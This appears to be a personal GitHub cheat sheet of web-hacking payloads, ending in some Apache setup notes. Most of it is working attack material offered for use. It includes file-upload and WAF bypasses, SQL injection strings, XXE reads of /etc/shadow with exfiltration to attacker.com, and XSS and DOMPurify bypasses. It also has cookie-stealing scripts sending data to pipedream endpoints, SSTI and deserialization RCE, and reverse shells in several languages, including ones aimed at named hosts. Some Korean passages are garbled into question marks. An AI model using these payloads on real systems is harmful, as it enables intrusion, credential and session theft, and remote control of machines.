# Chart
- [.htaccess](https://github.com/P0cas/Note#htaccess)
- [Upload Function](https://github.com/P0cas/Note#upload-function)
  - [Blacklisting Bypass](https://github.com/P0cas/Note#blacklisting-bypass)
  - [Whitelisting Bypass](https://github.com/P0cas/Note#whitelisting-bypass)
- [File Upload WAF Bypass](https://github.com/P0cas/Note#file-upload-waf-bypass)
- [SQL Injection](https://github.com/P0cas/Note#sql-injection)
  - [MySQL](https://github.com/P0cas/Note#mysql)
  - [SQLite](https://github.com/P0cas/Note#sqlite)
  - [PgSQL](https://github.com/P0cas/Note#pgsql)
- [XXE](https://github.com/P0cas/Note#xxe)
  - [Original](https://github.com/P0cas/Note#original)
  - [Feat SVG](https://github.com/P0cas/Note#feat-svg)
- [SSRF Payload](https://github.com/P0cas/Note#ssrf-payload)
- [Prototype Pollution](https://github.com/P0cas/Note#prototype-pollution)
- [XSS Payload](https://github.com/P0cas/Note#xss-payload)
  - [Reflected XSS](https://github.com/P0cas/Note#reflected-xss)
  - [Cookie Stealth](https://github.com/P0cas/Note#cookie-stealth)
  - [Dompurify Bypass](https://github.com/P0cas/Note#dompurify-bypass)
  - [VueJS XSS gadgets](https://github.com/P0cas/Note#vuejs-xss-gadgets)
- [XSS to RCE Electron Desktop Apps](https://github.com/P0cas/Note#xss-to-rce-electron-desktop-apps)
- [CSP Bypass](https://github.com/P0cas/Note#csp-bypass)
  - [Use an accepted domain](https://github.com/P0cas/Note#use-an-accepted-domain)
  - [AngularJS xss](https://github.com/P0cas/Note#angularjs-xss)
  - [CSP Option <=> Bypass](https://github.com/P0cas/Note#csp-option--bypass)
- [Javascript Payload](https://github.com/P0cas/Note#javascript-payload)
- [Server Side Template Injection](https://github.com/P0cas/Note#server-side-template-injection)
- [Path Traversal](https://github.com/P0cas/Note#path-traversal)
  - [Ubuntu](https://github.com/P0cas/Note#ubuntu)
  - [Node](https://github.com/P0cas/Note#node)
- [disable_functions bypass](https://github.com/P0cas/Note#disable-functions-bypass)
  - [Using a pcntl_exec function](https://github.com/P0cas/Note#using-a-pcntl-function)
  - [Using a FFI](https://github.com/P0cas/Note#using-a-ffi)
  - [Using an UAF Sandbox Escape](https://github.com/P0cas/Note#using-an-uaf-sandbox-escape)
- [Pollution Stuff in ejs module](https://github.com/P0cas/Note#pollution-stuff-in-ejs-module)
  - [outputFunctionName (Well known)](https://github.com/P0cas/Note#outputfunctionname-well-known)
  - [destructuredLocals (Unknown)](https://github.com/P0cas/Note#destructuredlocals-unknown)
- [Reverse Shell](https://github.com/P0cas/Note#reverse-shell)
  - [Bash](https://github.com/P0cas/Note#bash)
  - [PHP](https://github.com/P0cas/Note#php)
  - [Python](https://github.com/P0cas/Note#python)
  - [Node.js](https://github.com/P0cas/Note#nodejs)
  - [Ruby](https://github.com/P0cas/Note#ruby)
  - [Powershell](https://github.com/P0cas/Note#powershell)
- [Python Pickle RCE PoC](https://github.com/P0cas/Note#python-pickle-rce-poc)
  - [eval](https://github.com/P0cas/Note#eval)
  - [os.system](https://github.com/P0cas/Note#ossystem)
- [RCE with Ruby YAML.load](https://github.com/P0cas/Note#rce-with-ruby-yamlload)
- [IPv4 to IP Decimal Conversion](https://github.com/P0cas/Note#ipv4-to-ip-decimal-conversion)
- [Create an endpoint or Connection redirector](https://github.com/P0cas/Note#create-an-endpoint-or-connection-redirector)
- [Apache2 Install](https://github.com/P0cas/Note/blob/main/README.md#apache-2-install)
- [Apache2 -> HTTP to HTTPS](https://github.com/P0cas/Note/blob/main/README.md#apache2---http-to-https)
- [RSA shared key conflict](https://github.com/P0cas/Note/blob/main/README.md#rsa-shared-key-conflict)
- [Frida Command](https://github.com/P0cas/Note/blob/main/README.md#frida-command)
- [Docker Command](https://github.com/P0cas/Note/blob/main/README.md#docker-command)
- [Git Command](https://github.com/P0cas/Note/blob/main/README.md#git-command)
- [Port Open](https://github.com/P0cas/Note/blob/main/README.md#port-open)
- [ZSH Install](https://github.com/P0cas/Note/blob/main/README.md#zsh-install)
- [Node Install](https://github.com/P0cas/Note/blob/main/README.md#node-install)
- [Hexo Install](https://github.com/P0cas/Note/blob/main/README.md#hexo-install)
- [Puppeteer Setting file Install](https://github.com/P0cas/Note/blob/main/README.md#puppeteer-setting-file-install)

---
## .htaccess<br>

```txt
php_flag engine off
```
```txt
AddType application/x-httpd-php .pocas
```

```txt
php_flag zend.multibyte 1
php_value zend.script_encoding "UTF-7"
php_value auto_append_file .htaccess
#+ADw?php phpinfo()+ADs
```

```txt
#define test_width 1337
#define test_height 1337
AddType application/x-httpd-php .pocas
php_flag zend.multibyte 1
php_value zend.script_encoding "UTF-7"
```

```txt
#define width 1337
#define height 1337

AddType application/x-httpd-php .pocas
php_value zend.multibyte 1
php_value zend.detect_unicode 1
php_value display_errors 1
```

---
## Upload Function<br>

### Blacklisting Bypass
- PHP => `.php`, `.phtm`, `phtml`, `.phps`, `.pht`, `.php2`, `.php3`, `.php4`, `.php5`, `.shtml`, `.pahr`, `.pgif`, `.inc`<br>
- ASP => `.asp`, `.aspx`, `.cer`, `.asa`<br>
- JSP => `.jsp`, `.jspx`, `.jsw`, `.jsv`, `jspf`<br>

### Whitelisting Bypass
- file.jpg.php
- file.php.jpg
- file.php.blah123jpg
- file.php%00.jpt
- file.php\x00.jpt
- file.php%00
- file.php%20
- file.php%0d%0a.jpg
- file.php/
- file.php.\

---
## File Upload WAF Bypass
```
/?file=rce.php => Blocked
/?file=rce.php.jpg => Blocked
/?file=rce.php5 => Blocked
/?file===rce.php => Bypassed 200 OK
```

---
## SQL Injection<br>
### MySQL
```
- comments
#
--
/**/

- like
1=1, 1 in(1), 1 like 1, !(1<>1)

- count func
count()

- version check
@@version
version()
@@innodb_version;

- string split
mid()
right(left())
substr()
substring()

- sleep func
sleep(5), benchmark(40000000,md5(1));

- string to hex
ascii()
ord()

- add string
concat()
group_concat()

- string to hex
'admin' = 0x61646d696e

- whitespace bypass
%0a, %a0, %20, %09, %0d, %0c, %b, /**/, ()

- Conditional
if(1=1, 1, 0), case when 1=1 then 1 else 0 end;

- length func
length(), char_length(), character_length()

- Number of columns
' order by 1 --
' order by 2 --
' order by 3 --
' union null --
' union null, null --
' union null, null, null --

- etc
select load_file('/etc/passwd')
select database_name, table_name from mysql.innodb_table_stats
select table_schema from information_schema.schemas
select table_name from information_schema.tables
select column_name from information_schema.columns
select extractvalue(rand(),concat(0x3a,((select <column_name> from <table_name> limit 0, 1))))

- join
join?????? ?????????????????? ??????????????? ????????????????? ????????? ?????? ????????? ??????????????? ???????? ??????????????? ??????????????????. ????????? ?????????????????? Time Based Blind SQL Injection?????? ?????? ?????? ?????????.
ex ) cross join information_schema.statistics cross join information_schema.processlist cross join information_schema.tables as m cross join information_schema.columns on 1=1
```

### SQLite
```
- comments
--, /**/

- length check
length()

- like
1=1, 1 in(1), 1 like 1, 1==1, !(1<>1)

- version check
sqlite_version()

- string split
substr()

- add string
||, concat()

- sleep func
sqlite3_sleep()

- Conditional
case when 1=1 then 1 else 0 end

- limit
limit <count>
limit <skip>, <count>
limit <count> offset <skip>

- Number of columns
' order by 1 --
' order by 2 --
' order by 3 --
' union null --
' union null, null --
' union null, null, null --

- string to hex
unicode()

- select bypass
select 1 = values(1)
select 'admin' = values('admin')

- command injection
.sh ls, .shell ls, .system ls

- etc
select group_concat(sql), group_concat(name) from sqlite_master
union select group_concat(<column_name>), group_concat(<column_name>), null, null from <table_name>
```

### PgSQL
```
- coments
--, /**/

- length check
length()

- version check
version()

- like
=, in()

- string to hex
ascii()

- sleep func
pg_sleep()

- add string
||, concat(), string_agg()

- Number of columns
' order by 1 --
' order by 2 --
' order by 3 --
' union null --
' union null, null --
' union null, null, null --

- limit
limit <count>
limit <count> offset <skip>

- etc
select current_database()
select string_agg(table_name, ',') from information_schema.tables
string_agg(column_name, ','), null, null, null from information_schema.columns where table_name = <table_name>
select string_agg(<column_name>), null, null, null from <table_name>
```

---
## XXE
### Original

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE burp [<!ENTITY burp SYSTEM "file:///etc/shadow"> ]>
<lfi>&burp;</lfi>
```

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE burp [<!ENTITY burp system "domain"> ]>
<ssrf>&burp;</ssrf>
```

```xml
<burp xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></burp>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE burp [
<!ENTITY burp SYSTEM "php://filter/read=convert.base64-encode/resource=****">]>
<lfi>&burp;</lfi>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % xxe SYSTEM "http://ip/poc.dtd">
%xxe;
]>

// http://ip/poc.dtd
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?collect=%file;'>">
%all;
```

---
### feat svg

```xml
<?xml version="1.0" standalone="yes" ?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/issue" > ]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="40" x="0" y="15">&xxe;</text>
</svg>                    
```

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no???????>
<!DOCTYPE ENTY [ <!ENTITY XXE SYSTEM "file:///etc/issue??????> ]>
<svg xmlns:svg=??????ttp://www.w3.org/2000/svg" xmlns=??????ttp://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height=??????200">
<image xlink:href="http://EVILHOST:1337/SSRF?&XXE;" />
</svg>
```

```xml
<?xml version="1.1" standlone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <rect style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
  <script type="text/javascript">
    alert("XXE & XSS");
  </script>
</svg>
```

```xml
<code>
  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <svg onload="window.location='URL'" xmlns="http://www.w3.rog/200/svg">
    <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
  </svg>
</code>
```

---
## SSRF Payload<br>

```
http://127.0.0.1/
http://localhost/
https://127.0.0.1/
https://localhost/
http://0.0.0.0
http://[::]:80
http://0000::1:80/
http://0177.0.0.1/
http://2130706433/
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
HTtP:/\?????????alhost
```

---
## Prototype Pollution

```
const obj = {}
obj.__proto__ == obj.constructor.prototype # true
```

```js
const jsonpatch = require('fast-json-patch');
const a = {};
const payload = [{op:'replace', path:'/constructor/prototype/polluted', value:'Prototype Pollution'}];
jsonpatch.applyPatch(a, payload);

console.log(a.polluted) # Prototype Pollution
```

[Cheat Sheet](https://github.com/BlackFan/client-side-prototype-pollution)

---
## XSS Payload

### Reflected XSS statement 

```html
script tag
<scrit>void''??globalThis?.alert?.(...[0b1_0_1_0_0_1_1_1_0_0_1,],)</script>
<script src='https://cdn.jsdelivr.net/gh/wjddnjs33/Exploit/pocas.js'></script>
<script>alert(1)</scipt>
<script>this["alert"](this["document"]["cookie"]);</script>
<script>onerror=alert;throw 1</script>
<script>{onerror=alert}throw 1</script>
<script src="data:;base64,YWxlcnQoMSk="></script>
?????????r??????t??????lert(1)??????/???cr??????t??????
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js></script><div/ng-app><input/autofocus/ng-focus=$event.path|orderBy:'[].constructor.from([1],alert)'></div>
%2sscript%2ualert()%2s/script%2u

img tag
<img src=x onerror=window.alert(1) >
<img src=x onerror=window['eva'+'l'](alert(1)) >
<img src=x onerror=_=alert,_(/xss/) >
<img src=x onerror=_='e'+'val',_(alert(1)) >

svg tag
%u003Csvg onload=alert(1)>
%u3008svg onload=alert(2)> 
%uFF1Csvg onload=alert(3)>
<Svg%K9OnLoad=%7Krompt%6K1%6K>
<svg onload=&#97&#108&#101&#114&#116&#40&#49&#41>
<svg onload=alert&#0000000040document.cookie)>
<svg/onload=setTimeout('\141\154\145\162\164\50\61\51')>
<svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
<svg onx=() onload=window.alert?.()>
  
details tag
<details open ontoggle=top.alert(1)>
<details open ontoggle=top['prompt'](1)>
<details open ontoggle=eval('alert(1)') >
<details open ontoggle=eval(atob('YWxlcnQoMSk=')) >
<details open ontoggle=eval('\141\154\145\162\164\50\61\51') >
<details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) >
  
iframe tag
<iframe onload=alert(1)>
<iframe onload=&#97&#108&#101&#114&#116&#40&#49&#41>
<iframe srcdoc="<img src=x:x onerror=alert(1)>" />
<iframe onload=location='javascri'.concat('pt:aler','t(1)')>
<iframe onload=location=['java','script:','alert(1)'].join("")>
<iframe src="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+"></iframe>

body tag
<body onpageshow=alert(1)>
<body/onfocus=alert(1)>
<body/onload=alert(1)>
<body href=x %00 nonafterprint=confirm(document.domain) autofocus>
<body/onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)) >
  
  
input tag
<input autofocus onfocus=alert(1)>
<input type=image src onerror=alert(1)>
<input onblur=alert(1) id=x><input autofocus>
<input onbeforecopy=alert(1) value="XSS" autofocus>
<input/autofocus/onfocus=&#97&#108&#101&#114&#116&#40&#49&#41>
  
a tag
<a onmouseover="alert(1)">link</a>
<a href=# name=xss autofocus onfocus=alert(1)>
<a draggable="true" ondragend="alert(1)">test</a>
<a href="javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'">link</a>
  
video tag
<video onkeypress="alert(1)" contenteditable></video>
<video src=1 onerror=alert(/xss/)>
<video src onloadstart=alert(1)>
<video><source onerror=location=/http:\\domain.tld\page/.source+document.cookie >

button tag
<button onfocus=alert(1) autofocus>
<button ondblclick="alert(1)" autofocus tabindex=1>test</button>
<button onkeyup="alert(1)" contenteditable>test</button>
  
object tag
<object data='data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+'></object>
<object type='text/x-scriptlet' data='http://example.com/xss.html'></object>
  xss.html -> <script>alert(1)</script>
 
embed tag
<embed src="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+"></embed>
<embed src="javascript:alert(1)">
  
audio tag
<audio src=x onerror=alert(/xss/)>
  
textarea tag
<textarea autofocus onfocus=alert(1)>
  
meter tag
<meter onmouseover=alert(1)></meter>
<meter onmousemove="alert(1)"></meter>

select tag
<select autofocus onfocus=alert(1)>

form tag
<form onsubmit=alert(1)><button type=submit></button></form>
  
Constructor
{{+constructor.constructor("alert(document.cookie)")()+}}
  
Etc
ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
javascript:setInterval`alert\x28document.cookie\x29`'
javascript:alert\xdocument.\xookie\x
  
  
Special char Gadget
c: `${{}}`[!![]<<!![]<<!![]|!![]]
o: `${{}}`[!!{}<<![]]
n: `${[][~[]]}`[!!{}<<![]]
s: `${!![][~[]]}`[(!![]<<!![])|!![]]
t: `${![][~[]]}`[!{}<<![]]
r: `${![][~[]]}`[!!{}<<![]]
u: `${![][~[]]}`[!!{}<<!![]]
c: `${{}}`[!![]<<!![]<<!![]|!![]]
t: `${![][~[]]}`[!{}<<![]]
o: `${{}}`[!!{}<<![]]
r: `${![][~[]]}`[!!{}<<![]]
```

### Cookie Stealth
```html
<script>fetch('url'%2bdocument.cookie)</script>
<script>(new Image).src='url'%2bdocument.cookie;</script>
<script src="//code.jquery.com/jquery.min.js"></script><script>$.get('url'%2bdocument.cookie)</script>
<script src="//code.jquery.com/jquery.min.js"></script><script>$.getScript("//domain"%2bdocument.cookie)</script>
<video src=1 onerror="javascript:document.location='url'%2bdocument.cookie">
<iframe onload=location='javascri'.concat("pt:document",".location=","'url'%2bdocument.cookie")>
<iframe onload=location=["java","script:","document.location=","'url'%2bdocument.cookie"].join("")>
<svg/onload=setTimeout("\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0034\u0031\u002e\u0031\u0036\u0034\u002e\u0035\u0032\u002e\u0032\u0030\u0037\u003a\u0031\u0032\u0033\u0034\u0035\u002f\u003f\u0061\u003d\u0027\u002b\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0063\u006f\u006f\u006b\u0069\u0065")>
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js></script><div/ng-app><input/autofocus/ng-focus=$event.path|orderBy:'[].constructor.from([location.replace("//384bbb03a643480f7077ff3d9d4b01d5.m.pipedream.net?"+document.cookie)],console.log)'></div>
```

### DOMPurify Bypass
```html
<form><math><mtext><form><mglyph><style></math><img src onerror=alert(1)></style></mglyph></form></mtext></math></form>
<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
<math><mtext><table><mglyph><style><![CDATA[</style><img title="]]&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
```

### VueJS XSS gadgets

```html
VueJS version 2

<p v-show="_c.constructor`alert(1)`()">
<x v-on:click='_b.constructor`alert(1)`()'>click</x>
<x v-bind:a='_b.constructor`alert(1)`()'>
<x @[_b.constructor`alert(1)`()]>
<x :[_b.constructor`alert(1)`()]>
<p v-=_c.constructor`alert(1)`()>
<x #[_c.constructor`alert(1)`()]>
<p :=_c.constructor`alert(1)`()>
{{_c.constructor('alert(1)')()}}
{{_b.constructor`alert(1)`()}}
{{_c.constructor`alert(document.currentScript.nonce)`()}} 
```
```html
VueJS version 3

{{_openBlock.constructor('alert(1)')()}}
{{_createBlock.constructor('alert(1)')()}}
{{_toDisplayString.constructor('alert(1)')()}}
{{_createVNode.constructor('alert(1)')()}}
<p v-show="_createBlock.constructor`alert(1)`()">
<x @[_openBlock.constructor`alert(1)`()]>
<x @[_capitalize.constructor`alert(1)`()]>
<x @click=_withCtx.constructor`alert(1)`()>click</x>
<x @click=$event.view.alert(1)>click</x>
{{_Vue.h.constructor`alert(document.currentScript.nonce)`()}}
```

---
## XSS to RCE Electron Desktop Apps
```
Example Payloads (Windows):
<img src=x onerror="alert(require('child_process').execSync('calc').toString());"> 

Example Payloads (Linux & MacOS):
<img src=x onerror="alert(require('child_process').execSync('gnome-calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());"> 
<img src=x onerror="alert(require('child_process').execSync('id').toString());"> 
<img src=x onerror="alert(require('child_process').execSync('ls -l').toString());">
<img src=x onerror="alert(require('child_process').execSync('uname -a').toString());"> 
```

---
## CSP Bypass

### Use an accepted domain
```
Content-Security-Policy: script-src 'self' http://141.164.52.207
```
?????? ?????? script-src??? ?????? ???????????? ?????? ?????? ??????, ?????? ??????????????? ?????? ???????????? ??? ??? ????????? poc.html ????????? ????????? ???????????? CSP??? ????????? ??? ??????.

### AngularJS xss 
```
Content-Security-Policy: default-src 'self' script-src 'self' cdnjs.cloudflare.com;
```

```html
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js></script><div/ng-app><input/autofocus/ng-focus=$event.path|orderBy:'[].constructor.from([1],alert)'></div>

<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js></script><div/ng-app><input/autofocus/ng-focus=$event.path|orderBy:'[].constructor.from([location.replace("url"+document.cookie)],console.log)'></div>
```


### CSP Option <=> Bypass 
```html
Content-Security-Policy: 
default-src 'self' data: *; connect-src 'self'; script-src  'self' ;
report-uri /_csp; upgrade-insecure-requests

<iframe srcdoc='<script src="data:text/javascript,alert(1)"></script>'></iframe>
```
```html
Content-Security-Policy: script-src https://google.com 'unsafe-eval' data: http://*; 
child-src 'none'; 
report-uri /Report-parsing-url;

<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
```html
Content-Security-Policy: script-src https://*.google.com;

<script+src="https://accounts.google.com/o/oauth2/revoke?callback=(location.href='requestbin/?flag='+bdocument.cookie);"></script>
```
```html
<!-- Paypal CSP Bypass -->
<script type="application/x-component" data-component=paypal-checkout>
  alert(document.domain)
</script>
<script src="//www.paypalobjects.com/api/checkout.4.0.75.js">
</script>
```

---
## <span style="color:#21C587"></span> Javascript Payload<br>

```javascript
fetch('https://pocas.kr', {
  method: 'POST',
  headers: {'headerName':'headerValue'}
}).then(x=>x.text()).then(x=>fetch("https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f="+x));
```
```javascript
fetch('https://pocas.kr', {
  method: 'POST',
  headers: {'headerName':'headerValue'}
}).then(function(x){return x.text();}).then(function(xx){fetch("https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f="+xx)});
```
```javascript
x = new XMLHttpRequest();
x.open("GET", "https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f=" + document.cookie, true);
x.send();
```

```javascript
require(`fs`).readdirSync(`./`)
```

```javascript
require(`child_process`).execSync(`\x63at\x20<FILE>`).toString()
```

```javascript
require(`child_process`).execSync(`\x63at\x20T\x2a`).toString()
```

---
##  Server Side Template Injection

```python
{{7*7}}
{{config}}
{{config.items()}}
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```
```python
{{request|attr(request.args.param)}}&param=__class__
{{request[request.args.param]}}&param=__class__
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()}}
{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f??????)|attr(??????\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(287)('ls',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')}}
```
```javascript
Handlebars Template

{{JSON.stringify(process.env)}}
{{JSON.stringify(process.mainModule.constructor._load("child_process").exec("ls"))}}
```

---
##  Path Traversal

### Ubuntu
```txt
/etc/passwd
/etc/issue
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/proc/self/exe
/proc/net/arp
/proc/net/route
```

### Node 
```txt
package.json
```

---
## disable_functions bypass

### Using a pcntl_exec function
```php
<?php pcntl_exec('/bin/bash',['-c','ls']);?>
```

### Using a FFI
```php
PHP Version : 7.4.X 
Condition   : FFI Enable
<?php $ffi=FFI::cdef("int system(const char *command);");$ffi->system(\'ls\');?>
```

### Using an UAF Sandbox Escape

[https://ssd-disclosure.com/ssd-advisory-php-spldoublylinkedlist-uaf-sandbox-escape/](https://ssd-disclosure.com/ssd-advisory-php-spldoublylinkedlist-uaf-sandbox-escape/)

---
## Pollution Stuff in ejs module

### outputFunctionName (Well known)

```javascript
const express =  require('express');
const app = express();

app.set('views', __dirname + '/template');
app.set('view engine', 'ejs');

Object.prototype.outputFunctionName = "_; process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/domain/port 0>&1'`);//"

app.get('/', (req, res) => {
    res.render('index.ejs');
});

app.listen(3333);
```

### destructuredLocals (Unknown)

```javascript
// https://github.com/mde/ejs/blob/main/lib/ejs.js#L610
const express =  require('express');
const app = express();

app.set('views', __dirname + '/template');
app.set('view engine', 'ejs');

Object.prototype.destructuredLocals = ["a=22;throw process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/kve.kr/12345 0>&1'`)//"];

app.get('/', (req, res) => {
    res.render('index.ejs');
});

app.listen(3333);
```

---
## Reverse Shell 

### Bash 
```
bash -i >& /dev/tcp/domain/port 0>&1
bash -c 'bash -i >& /dev/tcp/domain/port 0>&1'
0<&196;exec 196<>/dev/tcp/domain/port; sh <&196 >&196 2>&196
```

### PHP 
```php
php -r '$sock=fsockopen("domain",port);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Python 
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("kaibro.tw",5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Node.js 
```javascript
var net = require("net"), sh = require("child_process").exec("/bin/bash"); var client = new net.Socket(); client.connect(port, "domain", function(){client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);});

require('child_process').exec("bash -c 'bash -i >& /dev/tcp/domain/port 0>&1'");
```

### Ruby 
```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("domain","port");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Powershell 
```
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c domain -p port -e cmd
```

---
## Python Pickle RCE PoC<br>

### eval 
```python
import __builtins__
import pickle
import base64

class rce(object):
  def __reduce__(self):
    x = "open('bash -i >& /dev/tcp/domain/port 0>&1').read()"
    return (__builtins__.eval, (x,))

print(base64.b64encode(pickle.dumps(rce())))
```

### os.system 
```python
import os
import pickle
import base64

class rce(object):
  def __reduce__(self):
    return (os.system, ('bash -i >& /dev/tcp/domain/port 0>&1',))

print(base64.b64encode(pickle.dumps(rce())))
```

---
## RCE with Ruby YAML.load

```
!!python/object/apply:subprocess.check_output ['ls']
!!python/object/apply:subprocess.check_output
       args: [ bash -i >& /dev/tcp/domain/port 0>&1 ]
       kwds: { shell: true }
!!python/object/apply:os.system ["wget https://requestbin/?`cat /etc/passwd`"]
```

---
## IPv4 to IP Decimal Conversion<br>
[Link](https://www.ipaddressguide.com/ip)

---
## Custom DNS Rebinding URL

[Link](https://lock.cmpxchg8b.com/rebinder.html)

---
## Custom HTTP Request URL

[Link](http://httpbin.org/)

---
## Create an endpoint or Connection redirector

[Link (Create an endpoint)](https://bugpoc.com/testers/other/mock)

[Link (Connection redirector)](https://bugpoc.com/testers/other/redir)

> Example

```txt
Response Headers >
{
  "Access-Control-Allow-Origin":"*",
  "Content-Type":"application/javascript"
}

Response Body >
window.parent.alert(1)

url : https://wv34ypjnazur.redir.bugpoc.ninja
```
```txt
Response Headers >
{
  "Access-Control-Allow-Origin":"*",
  "Content-Type":"application/javascript"
}

Response Body>
window.top.alert(1)

url : https://p93yp8ell2os.redir.bugpoc.ninja
```
```txt
Response Headers >
{
  "Access-Control-Allow-Origin":"*",
  "Content-Type":"application/javascript"
}

Response Body >
alert(1)

url : https://nq5h16dpmbg2.redir.bugpoc.ninja
```
```txt
Response Headers >
{
  "Content-Type":"application/javascript"
}

Response Body >
location.href = "https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f"+document.cookie

url : https://x6nbuhdfsr89.redir.bugpoc.ninja 
```

---
## Apache 2 Install
```
apt install apache2
apt install php

service apache2 start
service apache2 stop
service apache2 restart
```

---
## Apache2 -> HTTP to HTTPS

```
apt install snapd -y
snap install --classic certbot
certbot certonly --server https://acme-v02.api.letsencrypt.org/directory \\n--rsa-key-size 4096 --agree-tos --email <your email> --webroot -w /var/www/html \\n-d <domain>
cp default-ssl.conf <domain>-ssl.conf
a2enmod ssl
a2enmod <domain>-ssl.conf
service apache2 restart
```
```conf
# <domain>-ssl.conf
<IfModule mod_ssl.c>
	<VirtualHost *:443> # * or your ip
		ServerAdmin pocas.cyber@gmail.com
        ServerName <domain>
        ServerAlias <domain>

		DocumentRoot /var/www/html


		ErrorLog ${APACHE_LOG_DIR}/error.log
		CustomLog ${APACHE_LOG_DIR}/access.log combined

		SSLEngine on

        SSLCertificateFile  /etc/letsencrypt/live/<domain>/cert.pem
        SSLCertificateKeyFile /etc/letsencrypt/live/<domain>/privkey.pem
        SSLCertificateChainFile /etc/letsencrypt/live/<domain>/chain.pem
		<FilesMatch "\.(cgi|shtml|phtml|php)$">
				SSLOptions +StdEnvVars
		</FilesMatch>
		<Directory /usr/lib/cgi-bin>
				SSLOptions +StdEnvVars
		</Directory>
	</VirtualHost>
</IfModule>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

---
## RSA shared key conflict

```
ssh-keygen -R ip
```

---
## Frida Command

```
pip install frida
